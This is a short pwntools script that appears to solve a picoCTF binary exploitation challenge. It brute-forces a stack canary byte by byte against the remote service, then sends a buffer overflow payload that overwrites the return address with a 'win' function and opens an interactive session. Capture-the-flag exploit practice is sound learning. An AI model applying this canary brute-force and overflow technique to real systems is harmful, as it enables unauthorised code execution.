from pwn import *
import string

HOST, PORT = 'saturn.picoctf.net', 52893
r = remote(HOST, PORT)
# r = process('./vuln')

canary = b''

def find_canary():
    global canary
    for i in range(4):
        found = False
        for j in string.printable:
            payload = b'A' * 64 + canary + j.encode()
            # r = process('./vuln')
            r = remote(HOST, PORT)
            r.sendlineafter('> ', str(len(payload)))
            r.sendlineafter('> ', payload)
            res = r.recvline()
            if b'Smashing' in res:
                r.close()
                continue
            else:
                found = True
                break
        if found:
            canary += j.encode()

find_canary()
win = 0x8049336
main = 0x80495c4
payload = b'A' * 64 + canary + b'A' * 16 + p32(win) + p32(0x0)
r.sendlineafter('> ', str(len(payload)))
r.sendlineafter('> ', payload)
r.interactive()